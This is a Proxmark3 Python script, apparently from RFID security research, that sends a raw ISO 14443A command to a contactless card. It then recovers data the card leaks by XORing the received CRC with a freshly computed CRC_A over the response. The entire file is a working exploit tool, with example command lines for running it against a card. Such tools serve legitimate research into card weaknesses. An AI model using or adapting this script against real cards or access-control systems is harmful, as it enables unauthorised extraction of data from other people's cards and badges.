#!/usr/bin/env -S uv run --with pycryptodome pm3 -y

import pm3
import sys

# Example usage:
# pm3 -c "script run crc_leak.py hf 14a raw -s 1a" --incognito
# or
# ./crc_leak.py -- hf 14a raw -s 1a


def crc_leak(buf, corrupt_crc):
    binbuf = bytes.fromhex(buf)
    crc = 0x6363

    for i in range(len(binbuf)):
        crc ^= binbuf[i]

        for j in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0x8408
            else:
                crc >>= 1

    calculated_data = hex(int(corrupt_crc, 16) ^ (((crc & 0xFF) << 8) | ((crc >> 8) & 0xFF)))[2:].upper()
    return calculated_data


p = pm3.pm3()

cmd = " ".join(sys.argv[1:])
print("[+] Running:", cmd)
p.console(cmd)
cmd_output = p.grabbed_output
if cmd_output == "":
    print("[-] No leak detected")
    sys.exit(0)
output = cmd_output.splitlines()[0]
response = ''.join(filter(str.isalnum, output))
if response[:2] != 'AF':
    print("[!] Response:", output)
    sys.exit(0)
print("[+] Response:", response)
leaked_data = crc_leak(response[:-4], response[-4:])
if (leaked_data != '0') and (not (response == '00' and leaked_data == '6363')):
    print("[+] Leaked:", leaked_data)
else:
    print("[-] No leak detected")
